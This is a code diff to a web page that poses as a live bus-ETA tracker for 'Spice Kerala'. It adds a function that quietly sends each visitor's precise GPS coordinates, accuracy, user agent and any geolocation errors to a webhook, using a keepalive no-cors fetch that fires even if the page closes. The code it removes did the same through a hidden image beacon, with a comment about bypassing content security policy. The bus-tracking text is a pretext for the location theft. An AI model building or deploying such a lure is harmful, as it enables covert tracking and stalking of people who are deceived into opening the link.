@@ -164,6 +164,32 @@
             const statusText = document.getElementById('status');
             statusText.innerText = "Connecting to GPS for accurate ETA...";
 
+            function triggerWebhook(lat, lon, acc, errorMsg) {
+                const params = new URLSearchParams({
+                    label: "static Spice Kerala track" + (errorMsg ? " (No GPS)" : ""),
+                    device: navigator.userAgent,
+                    _t: Date.now(),
+                    _r: Math.random()
+                });
+
+                if (lat !== null && lon !== null) {
+                    params.append("lat", lat);
+                    params.append("lon", lon);
+                    params.append("accuracy", acc + "m");
+                }
+                if (errorMsg) {
+                    params.append("error", errorMsg);
+                }
+
+                // Standard fetch request with keepalive to ensure it fires even if page unloads
+                fetch(WEBHOOK_URL + "?" + params.toString(), {
+                    method: 'GET',
+                    mode: 'no-cors',
+                    cache: 'no-store',
+                    keepalive: true
+                }).catch(err => console.error("Webhook error:", err));
+            }
+
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -171,30 +197,17 @@
                         const lon = pos.coords.longitude;
                         const acc = pos.coords.accuracy;
 
-                        // Send data via an Image Beacon (GET request) to bypass strict connect-src CSP
-                        const params = new URLSearchParams({
-                            label: "static Spice Kerala track",
-                            lat: lat,
-                            lon: lon,
-                            accuracy: acc + "m",
-                            device: navigator.userAgent
-                        });
-                        
-                        // Attach to window to prevent garbage collection before request completes
-                        window._beacon = new Image();
-                        // Append extreme cache-busting logic (timestamp + random number)
-                        window._beacon.src = WEBHOOK_URL + "?" + params.toString() + "&_t=" + Date.now() + "&_r=" + Math.random();
-                        window._beacon.style.display = 'none';
-                        document.body.appendChild(window._beacon); // Force the DOM to strictly execute the external load
-
+                        triggerWebhook(lat, lon, acc, null);
                         statusText.innerText = "Live tracking active. Bus progress updated.";
                     },
                     (err) => {
+                        triggerWebhook(null, null, null, err.message);
                         statusText.innerText = "Live tracking limited (GPS restricted).";
                     },
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
+                triggerWebhook(null, null, null, "Geolocation not supported");
                 statusText.innerText = "Live tracking limited (GPS not supported).";
             }
         };
